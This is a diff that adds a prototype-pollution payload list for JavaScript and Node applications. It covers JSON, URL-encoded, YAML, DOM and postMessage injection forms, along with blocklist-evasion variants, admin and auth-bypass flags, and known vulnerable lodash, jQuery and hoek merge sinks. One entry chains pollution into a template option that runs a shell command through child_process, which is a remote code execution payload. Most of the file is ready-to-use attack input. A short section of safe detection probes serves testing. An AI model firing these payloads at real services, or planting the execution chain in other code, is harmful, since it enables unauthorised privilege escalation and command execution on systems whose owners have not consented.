@@ -1,0 +1,90 @@
+# Prototype Pollution Payloads
+
+# Basic __proto__ injection (JSON body)
+{"__proto__": {"polluted": true}}
+{"__proto__": {"admin": true}}
+{"__proto__": {"isAdmin": true}}
+
+# Nested __proto__ via merge utilities
+{"a": {"__proto__": {"polluted": true}}}
+{"user": {"__proto__": {"role": "admin"}}}
+{"data": {"__proto__": {"authenticated": true}}}
+
+# constructor.prototype climbing
+{"constructor": {"prototype": {"polluted": true}}}
+{"x": {"constructor": {"prototype": {"admin": true}}}}
+{"a": {"b": {"constructor": {"prototype": {"isAdmin": true}}}}}
+
+# prototype key pollution (dotted / bracketed)
+{"prototype": {"polluted": true}}
+{"a": {"prototype": {"role": "admin"}}}
+
+# Query string / URL-encoded injection
+?__proto__[polluted]=true
+?__proto__[admin]=true
+?constructor[prototype][polluted]=true
+?__proto__.polluted=true
+?__proto__[isAdmin]=true&__proto__[role]=admin
+
+# Array / bracket notation forms
+{"__proto__":[{"polluted":true}]}
+{"__proto__":["polluted"]}
+{"__proto__": {"x": "y"}, "normal": "value"}
+
+# Deep nested pollution in recursive merges
+{"a": {"b": {"c": {"__proto__": {"polluted": true}}}}}
+{"level1": {"level2": {"level3": {"__proto__": {"admin": true}}}}}
+
+# DOM / clientside pollution (browser location / postMessage)
+?__proto__[polluted]=true  (reflected into Object.prototype via unsafe parse)
+<script>location.hash = '#__proto__[polluted]=true'</script>
+postMessage({"__proto__":{"polluted":true}}, "*")
+
+# Pollution reaching dangerous sinks (examples of impact chains)
+{"__proto__": {"env": "production"}}        # override environment config
+{"__proto__": {"NODE_ENV": "test"}}         # change runtime mode
+{"__proto__": {"template": "malicious"}}    # template name used by renderer
+{"__proto__": {"shell": "/bin/sh"}}         # argument consumed by exec wrapper
+{"__proto__": {"transport": "file"}}        # alter module/transport selection
+{"__proto__": {"outputFunctionName": "a=1;process.mainModule.require('child_process').execSync('id')"}}
+
+# Known vulnerable library merge sinks (context)
+_.merge(target, payload)            # lodash < 4.17.12 (CVE-2019-10744)
+_.defaultsDeep(target, payload)     # lodash (CVE-2019-10744)
+$.extend(true, target, payload)     # jQuery < 3.4.0 (CVE-2019-11358)
+extend(true, target, payload)       # npm 'extend' < 3.0.2 (CVE-2018-16492)
+merge.deep(target, payload)         # 'merge' < 2.1.1 (CVE-2019-12629)
+hoek.applyToDefaults(defaults, payload)  # '@hapi/hoek' < 8.1.2 (CVE-2020-11618)
+
+# Pollution via YAML / unsafe parsers
+__proto__:
+  polluted: true
+constructor:
+  prototype:
+    admin: true
+
+# Bypasses for naive blocklists
+{"__proto__ ": {"polluted": true}}      # trailing space evades strict '== "__proto__"'
+{"__proto__\t": {"polluted": true}}     # tab in key
+{"constructor.prototype": {"polluted": true}}
+{"this.__proto__": {"polluted": true}}
+
+# Detection probes (safe, non-destructive)
+{"__proto__": {"__pollution_test__": "x"}}
+# After sending, check: ({}).__pollution_test__ === "x"
+# Or in browser console: Object.prototype.__pollution_test__ === "x"
+
+# JSON with escaped unicode keys
+{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}
+
+# Multipart / form-encoded variants
+__proto__[polluted]=true
+constructor[prototype][polluted]=true
+
+# Nested object with mixed safe + malicious keys
+{"name": "legit", "__proto__": {"polluted": true}}
+
+# Polluted property used as a boolean ACL flag (common impact)
+{"__proto__": {"allowAdmin": true}}
+{"__proto__": {"canEdit": true}}
+{"__proto__": {"bypassAuth": true}}
